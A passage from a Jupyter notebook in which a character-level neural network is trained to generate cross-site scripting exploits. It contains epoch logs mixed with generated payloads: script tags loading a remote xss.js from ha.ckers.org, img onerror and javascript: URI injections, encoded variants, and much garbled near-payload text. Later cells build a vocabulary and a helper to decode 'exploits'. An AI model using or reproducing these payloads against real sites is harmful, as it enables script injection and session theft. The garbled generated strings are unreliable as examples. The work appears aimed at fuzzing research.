            "<IMG SRC='vbscript:msgbox(decooner&#x44;'\n",
            "\n",
            "\"0TexPC=9 :nmrod0/onerame=prs\"bd>\n",
            "<\"foL hing</sim/6\"></script>\\\"1FO5LDIFRC'x t1p\n",
            "/`<scrip<sstyle SONTENT=unaH8AC;/PzM.{'>\n",
            "<IMGSSRC=\"jadoPAD;/-ccms=\"></SCRIPT>alert(\"t;)></sCRIPT>\n",
            "<ur>\n",
            "764/764 [==============================] - 370s 484ms/step - loss: 1.1281\n",
            "Epoch 14/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1230.ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>;\">\n",
            "<SCRIPT SRC=\";http://ha.ckers.org/xss.com/xss.jsg//alert('XSS');\">\n",
            "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">\n",
            "\n",
            ".ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n",
            "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>&lo;IxRC&gt;\n",
            "&lt;STAulaTa&%jae;>;javascript:alert(%2r)4-?xmonlerc&#pal;\"&a>\n",
            "<comux45\n",
            "<script*Alert)\n",
            "\"></ifromhtes=\"javascript:alert(1)\" id=\"fuzzelement1\"ctes\">\n",
            "<RKhtelea id=jaualorCrIPXSSY8&g(;&lt;\n",
            "764/764 [==============================] - 371s 485ms/step - loss: 1.1230\n",
            "Epoch 15/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1098'<iframe/onload=confirm(1)>'\n",
            "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n",
            "<sVg><scRipt >alert&lpar;1&rpar; {Opera}\n",
            "<img/src=`` onerror=this.onerror=confirm(1) \n",
            "<form><isindex formaction=\"javascript:alert(1)\"></body onLous=\"javascript:alert(1)\"></body onLoad=\"javascript:alert(1)\"></script>\n",
            "<script>javascript:alert(1)\"></script>\n",
            "<script>alert(1)\"></svg onloro=\"javascript:alert(1)\"></om\n",
            "'<iframe/onload=confirm(1)>'\n",
            "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n",
            "<sVg><scRipt >alert&lpar;1&rpar; {Opera}\n",
            "<img/src=`` onerror=this.onerror=confirm(1) \n",
            "<form><isindex formaction=\"dav;limp:shtipt2s-_5` YMEcEA2ibj-chado:brid4%.03sm}/xsCyljaiascript:alert(\\XSSer)'\">\n",
            "<2D\\x 3'>dEt-seCid5 ADIy\"[XHSjfv\"S:2if=\"seS;\"dl&apos;J8;R&gt[;conerr]R<Ud>(\";\">alort('XS8');\">\n",
            "<imG SRC=javascript\n",
            "764/764 [==============================] - 373s 488ms/step - loss: 1.1098\n",
            "Epoch 16/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.0987autofocus/onfocus=alert()>\n",
            "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n",
            "<IMG SRC=\"javascript:alert('XSS');\">\n",
            "<IMG SRC=javascript:alert('XSS')>\n",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>\n",
            "<IMG SRC=javascript:alert(1)</script>\n",
            "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)>\n",
            "<script src=\" onerror=\"javascript:alert(1)</script>\n",
            "<script>alert('XSS');\">\n",
            "<IMG SRC=javascript:alert('XSS');\">\n",
            "<IMG SRC=x onerror=\"java\n",
            "autofocus/onfocus=alert()>\n",
            "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n",
            "<IMG SRC=\"javascript:alert('XSS');\">\n",
            "<IMG SRC=javascript:alert('XSS')>\n",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>\n",
            "<IMG SRC=javascript:alert(\"\\gteutma0,\\00+7N1k/CNhrtpoof:ale9adew=(javascript1al;<3.')\n",
            "<` 4<brcyin=\"reete:dal(-(ma3cscri/t(faccspidac-ionMW(' S9Y\n",
            "</foptrcodyt al;\"javascript:alert(1)</scriptlest<style><imgascript>alirt('\n",
            "764/764 [==============================] - 374s 489ms/step - loss: 1.0987\n",
            "Epoch 17/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.0893lement1\">test</a>\n",
            "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\x01javascript:javascript:alert(1)\"></body onbodocument.vulnerable=true;\">\n",
            "<img src=\"javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\xE9\\x80javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\xE\n",
            "lement1\">test</a>\n",
            "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\x01javascript:javascript:javascript:a/ert%21>2ut onmouseover=&reatc\\xmE lBo&dt;ci( T&T9b;cksc&les-><eSCR/PT=\"alert(String.srurC#xeonor6',javascript:alert(1)\" \"Hg G'\";javg (<avp>\n",
            "<it#x s` on*rouriptape=\"tXja<sscrimt;b>\\0S\n",
            "764/764 [==============================] - 373s 489ms/step - loss: 1.0893\n",
            "Epoch 18/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.0801cript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>\n",
            "<script ~~~>alert(0%0)</script ~~~>\n",
            "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>\n",
            "<///style///><span %2F onmousemove=\"javascript:alert(1)\"></body onReadeString.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onmouseover=\"alert(1)\"></html onMouseolerronteuteoutler\n",
            "cript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>\n",
            "<script ~~~>alert(0%0)</script ~~~>\n",
            "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>\n",
            "<///style///><span %2F onmousemovex>\n",
            "<sva.remaioa=\"jdvcschi&#50;crifsameg\n",
            "<sc ip \\x0style xR\t=java6cript html>\n",
            "<impteC><hgtgindif=\"javascript:javascript:alert(1)</scripT>&TauLn!O(8:,83)!e/sezX1 ''>\n",
            "<ppojavascript\\x27=javascript:alert\n",
            "764/764 [==============================] - 371s 486ms/step - loss: 1.0801\n",
            "Epoch 19/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.0737cript>\\xE2\\x80\\xA8javascript:alert(1)</script>\n",
            "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>\n",
            "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>\n",
            "\"`'><script>\\x0Cjavascript:alert(1)</script>\n",
            "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)\"></iframe onerror=\"javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\xE2\\x80\\x80javascript:alert(1)\"></imptex onerror=javascript:alert(1)\">\n",
            "cript>\\xE2\\x80\\xA8javascript:alert(1)</script>\n",
            "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>\n",
            "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>\n",
            "\"`'><script>\\x0Cjavascript:alert(1)</script>\n",
            "\"` d crmptidt}:aeseroaEaDL><IM0 STYLE=javascript:confocmavs:<Ta! oaLt in=\"}N1script:xsc:istb![[D=\\\\08Re&lime;\"het=\">a TiTabjefaad[image&#AMD&Tpgte\n",
            "1[\\frrctipt:tdatfwFc6if3A'-alirt(\\\"javascript:alert(1)>\n",
            "764/764 [==============================] - 369s 483ms/step - loss: 1.0737\n",
            "Epoch 20/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.0652&gt;&lt;/SPAN&gt;\n",
            "&lt;HTML&gt;&lt;BODY&gt;\n",
            "&lt;?xml&#58;namespace prefix=\\\"t\\\" ns=\\\"urn&#58;schemas-microsoft-com&#58;time\\\"&gt;\n",
            "&lt;?import namespace=\\\"t\\\" implementation=\\\"#default#time2\\\"&gt;\n",
            "&lt;t html&#0000007&#0000114&#0000110&#110;&#111&#111>&#111&#112&#112&#111&#111&#111&#112&#116&#112&#112&#111&#111&#111&#112&#112&#116&#111&#101&#111&#111&#111&#111&#112&#112&#116&#116&#111&#114&#11&#111&#\n",
            "&gt;&lt;/SPAN&gt;\n",
            "&lt;HTML&gt;&lt;BODY&gt;\n",
            "&lt;?xml&#58;namespace prefix=\\\"t\\\" ns=\\\"urn&#58;schemas-microsoft-com&#58;time\\\"&gt;\n",
            "&lt;?import namespace=\\\"t\\\" implementation=\\\"#default#time2\\\"&gt;\n",
            "&lt;t xA9;\\x0Bjj'&quot;&sta/STYLE&gt;\n",
            "&lt;d wRA4e;'&gt;k&le>;\n",
            "<BB>http://%0247&#po4;criXhSco)/XML\">STAI-5 jATA orgrrs=y=\"javascript:alert(1)>\n",
            "\"<t=&a&0153;\n",
            "<script:us'\n",
            "<httgD&T SBEI\" &#07;&#97;&#n2&#A3;&#99\n",
            "764/764 [==============================] - 367s 481ms/step - loss: 1.0652\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Word Embedding \n",
        "Another way to represent the data to our network will be using word embedding. the process will be almost similar expect instead using One-Hot-Encoding we will use the Embedding layer of tensorflow."
      ],
      "metadata": {
        "id": "fX-6HDbv8QvK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Create our vocabulary \n",
        "vocabulary = sorted(set(data))"
      ],
      "metadata": {
        "id": "BXayZB5k864E"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Vectorize: conver the string characters to numerical form \n",
        "chars_to_indices = tf.keras.layers.StringLookup(\n",
        "    vocabulary=list(vocabulary), mask_token=None\n",
        ")\n",
        "\n",
        "# To decode indices to characters vocabulary used to convert characters to indices\n",
        "# is used this will insure that unknown characters which do not exist in the \n",
        "# vocabulary are repsented as they are. \n",
        "indices_to_chars = tf.keras.layers.StringLookup(\n",
        "    vocabulary=chars_to_indices.get_vocabulary(), invert=True, mask_token=None\n",
        ")\n",
        "\n",
        "# Utility function to join characters and form the exploit \n",
        "def exploit_from_indices(indices):\n",
        "  return tf.strings.reduce_join(indices_to_chars(indices), axis=-1)"
      ],
      "metadata": {
        "id": "SPAFhTCT9Cfd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Preparing data for prediction \n",
        "As the previous implementation the data will be divided into input sequence and target characters to train our model. "
      ],
      "metadata": {
        "id": "DFArnK_l-Vux"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Get all indices from and create a numerical dataset of sequences \n",
        "indices = chars_to_indices(tf.string.unicode_split(data, 'UTF-8'))\n",
        "indices_dataset = tf.data.Dataset.from_tensor_slices(indices)\n",
        "\n",
        "# Example \n",
        "for indices in indices_dataset.take(10):\n",
        "  print(indices_to_chars(indices).numpy().decode('utf-8'))"
      ],
      "metadata": {
        "id": "lv4k700MAViq"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Create sequences of a fixed length \n",
        "seq_length = 200\n",
        "sample_per_epoch = len(data) // (seq_length+1)\n",
        "sequences = indices_dataset.batch(seq_length+1, drop_remainder=True)\n",
        "# Example\n",
        "for seq in sequences.take(1):\n",
        "  print(indices_to_chars(seq))"
      ],
      "metadata": {
        "id": "qABwxgdYHMmN"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}